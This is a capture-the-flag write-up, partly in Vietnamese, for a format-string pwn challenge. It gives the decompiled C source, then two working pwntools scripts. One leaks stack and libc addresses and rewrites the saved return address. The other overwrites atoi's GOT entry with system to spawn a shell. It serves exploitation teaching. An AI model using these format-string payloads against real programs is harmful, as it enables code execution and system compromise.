# Formatstring2

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## source code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  __int64 buf[2]; // [rsp+0h] [rbp-B0h] BYREF
  char format[80]; // [rsp+10h] [rbp-A0h] BYREF
  char name[72]; // [rsp+60h] [rbp-50h] BYREF
  int v8; // [rsp+A8h] [rbp-8h]
  int fd; // [rsp+ACh] [rbp-4h]

  init(argc, argv, envp);
  memset(name, 0, 0x3CuLL);
  memset(format, 0, sizeof(format));
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
  {
    puts("Something went wrong");
    exit(1);
  }
  read(fd, buf, 4uLL);
  v3 = time(buf);
  srand(v3);
  lucky = rand();
  puts("Viettel Challenge\n");
  printf("Give me your name: ");
  read(0, name, 0x3CuLL);
  printf("Hi guy,");
  printf(name);
  puts("\nCan you guess the lucky number?");
  printf("Your input: ");
  read(0, format, 80uLL);
  printf("Your lucky is here: ");
  printf(format);
  v8 = atoi(format);
  if ( lucky != v8 )
  {
    puts("Good luck :D");
    exit(0);
  }
  puts("You are lucky man! Congrat,");
  printf(name);
  return 0;
}
```

## Vulnerability

Chương trình có 2 lỗi format string: `printf(name)`, `printf(format)`. Ở lần gọi `printf(name)` đầu ta có thể dùng để leak libc address. Ở lần gọi `printf(format)` sau ta có thể dùng để overwrite GOT của `atoi` thành `system`. Vì bài chỉ cho file thực thi nhưng ko cho file libc, nên mình sẽ coi như đang làm bài trên server và tìm cách lấy được phiên bản libc.

### script

```python
p = start()
rop = ROP(elf)

payload = b'aa%33$p.%2264c%23$lln%87c%24$hhnaaaabaaa' + p64(0x601068) + p64(0x60106a)
p.sendafter(b'name: ', payload)
p.recvuntil(b'guy,aa')
stackaddr = int(p.recvuntil(b'.', drop=True), 16)
log.info('Stack Address: ' + hex(stackaddr))
savedRIP = stackaddr - 0x1d0
log.info('Saved RIP: ' + hex(savedRIP))
RandonNumberAddr = 0x6010CC

offset = 9
writes = {
    savedRIP + 16 : elf.plt['puts']
}
payload = b'aaaaaaaa' + fmtstr_payload(offset, writes,numbwritten= 8, write_size='byte')
p.sendafter(b'input: ', payload)

offset = 18
writes = {
    RandonNumberAddr: 0,
    savedRIP: rop.find_gadget(['pop rdi', 'ret'])[0],
}

payload = fmtstr_payload(offset, writes, write_size='short')
p.sendafter(b'name: ', payload)
p.recvuntil(b'guy,')
log.info('len of payload: ' + str(len(payload)))

offset = 9 
writes = {
    savedRIP + 8: elf.got['puts']
}

payload = b'aaaaaaaa' + fmtstr_payload(offset, writes,numbwritten=8, write_size='short')
log.info('len payload: ' + str(len(payload)))
p.sendafter(b'input: ', payload)

p.interactive() 
```

And here we go!

![leak](./leak.png)

sau khi biết được offset hàm puts thì mình dùng  libc database search để tìm được phiên bản libc của server.

## Exploit

```python
p = start()
libc = ELF('./libc6_2.35-0ubuntu3.1_amd64.so')

payload = b'%6$p.%29$p.'
p.sendafter(b'name: ', payload)
p.recvuntil(b'guy,')
randomNum = int(p.recvuntil(b'.', drop=True), 16)
log.info('randomNum: ' + hex(randomNum))
libc.address = int(p.recvuntil(b'.', drop=True), 16) -  0x29d90
log.info('libc.address: ' + hex(libc.address))

offset = 9 
writes = {
    elf.got['atoi']: libc.symbols['system'],
}


payload = b'/bin/sh;' + fmtstr_payload(offset, writes, numbwritten=8, write_size='short')
log.info('len payload: ' + str(len(payload)))
p.sendafter(b'input: ', payload)
p.clean(1)
p.interactive()
```